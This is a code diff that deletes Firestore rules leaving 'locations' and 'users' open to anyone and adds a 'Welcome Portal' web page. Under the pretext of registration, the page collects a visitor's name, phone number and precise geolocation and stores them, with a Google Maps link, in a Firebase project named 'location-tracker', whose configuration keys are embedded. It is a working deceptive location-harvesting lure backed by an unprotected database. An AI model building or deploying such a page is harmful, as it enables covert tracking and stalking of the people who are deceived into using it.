@@ -1,15 +1,436 @@
-rules_version = '2';
+<!DOCTYPE html>
+<html lang="en">
 
-service cloud.firestore {
-  match /databases/{database}/documents {
+<head>
 
-    match /locations/{id} {
-      allow read, write: if true;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    match /users/{id} {
-      allow read, write: if true;
-    }
+<title>Welcome Portal</title>
 
-  }
+<link rel="icon" href="favicon.ico">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Segoe UI,sans-serif;
 }
+
+body{
+
+min-height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+
+background:linear-gradient(135deg,#020617,#111827,#312e81);
+
+color:white;
+
+}
+
+
+.card{
+
+width:90%;
+max-width:430px;
+
+padding:35px;
+
+border-radius:25px;
+
+background:rgba(255,255,255,.08);
+
+backdrop-filter:blur(20px);
+
+border:1px solid rgba(255,255,255,.15);
+
+text-align:center;
+
+box-shadow:0 20px 50px #0008;
+
+}
+
+
+h1{
+font-size:32px;
+margin-bottom:15px;
+}
+
+
+p{
+
+color:#cbd5e1;
+line-height:1.6;
+margin:15px 0;
+
+}
+
+
+button{
+
+width:100%;
+
+padding:15px;
+
+border:0;
+
+border-radius:15px;
+
+background:linear-gradient(135deg,#2563eb,#9333ea);
+
+color:white;
+
+font-size:17px;
+
+font-weight:bold;
+
+cursor:pointer;
+
+}
+
+
+input{
+
+width:100%;
+
+padding:14px;
+
+margin:8px 0;
+
+border:none;
+
+border-radius:12px;
+
+background:#1f2937;
+
+color:white;
+
+font-size:16px;
+
+}
+
+
+
+.overlay{
+
+position:fixed;
+
+inset:0;
+
+background:#000b;
+
+display:flex;
+
+align-items:center;
+
+justify-content:center;
+
+z-index:10;
+
+}
+
+
+
+.popup{
+
+width:85%;
+
+max-width:360px;
+
+background:#111827;
+
+padding:30px;
+
+border-radius:25px;
+
+text-align:center;
+
+animation:pop .4s;
+
+}
+
+
+
+@keyframes pop{
+
+from{
+transform:scale(.5);
+opacity:0;
+}
+
+to{
+transform:scale(1);
+opacity:1;
+}
+
+}
+
+
+</style>
+
+</head>
+
+
+<body>
+
+
+
+<!-- STEP 1 -->
+
+<div class="overlay" id="step1">
+
+
+<div class="popup">
+
+<h2>👋 Welcome</h2>
+
+<p>Step 1/2</p>
+
+<p>Enter your information to continue</p>
+
+
+<input id="name" placeholder="Your Name">
+
+
+<input id="phone" placeholder="Phone Number">
+
+
+<button onclick="nextStep()">
+Continue
+</button>
+
+
+</div>
+
+</div>
+
+
+
+
+<!-- STEP 2 -->
+
+<div class="overlay" id="step2" style="display:none;">
+
+
+<div class="popup">
+
+
+<h2>📍 Permission</h2>
+
+<p>Step 2/2</p>
+
+<p>
+Allow location permission to complete registration
+</p>
+
+
+<button onclick="requestLocation()">
+Allow Permission
+</button>
+
+
+</div>
+
+</div>
+
+
+
+
+<!-- SUCCESS -->
+
+<div class="overlay" id="success" style="display:none;">
+
+
+<div class="popup">
+
+<h2>✅ Registration Successful</h2>
+
+<p>
+Welcome! Your registration is complete.
+</p>
+
+
+</div>
+
+</div>
+
+
+
+
+<div class="card">
+
+
+<h1>
+Welcome 👋
+</h1>
+
+
+<p>
+Complete registration to continue.
+</p>
+
+
+</div>
+
+
+
+
+
+<script type="module">
+
+
+import {initializeApp}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+
+import {
+
+getFirestore,
+collection,
+addDoc,
+serverTimestamp
+
+}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+
+
+
+
+const firebaseConfig={
+
+
+apiKey:"AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",
+
+authDomain:"location-tracker-1aa74.firebaseapp.com",
+
+projectId:"location-tracker-1aa74",
+
+storageBucket:"location-tracker-1aa74.firebasestorage.app",
+
+messagingSenderId:"836267695111",
+
+appId:"1:836267695111:web:1b6ddd5d4a85a350099ea2"
+
+
+};
+
+
+
+const app=initializeApp(firebaseConfig);
+
+
+const db=getFirestore(app);
+
+
+
+let userName="";
+let userPhone="";
+
+
+
+
+
+window.nextStep=function(){
+
+
+userName=document.getElementById("name").value.trim();
+
+userPhone=document.getElementById("phone").value.trim();
+
+
+
+if(!userName || !userPhone){
+
+alert("Please enter name and phone");
+
+return;
+
+}
+
+
+
+document.getElementById("step1").style.display="none";
+
+document.getElementById("step2").style.display="flex";
+
+
+};
+
+
+
+
+
+
+window.requestLocation=function(){
+
+
+navigator.geolocation.getCurrentPosition(
+
+saveUser,
+
+()=>alert("Location permission is required")
+
+);
+
+
+};
+
+
+
+
+
+
+async function saveUser(position){
+
+
+await addDoc(collection(db,"users"),{
+
+
+name:userName,
+
+phone:userPhone,
+
+
+latitude:position.coords.latitude,
+
+
+longitude:position.coords.longitude,
+
+
+accuracy:position.coords.accuracy,
+
+
+map:
+`https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+
+
+created:serverTimestamp()
+
+
+});
+
+
+
+document.getElementById("step2").style.display="none";
+
+
+document.getElementById("success").style.display="flex";
+
+
+}
+
+
+
+</script>
+
+
+</body>
+
+</html>
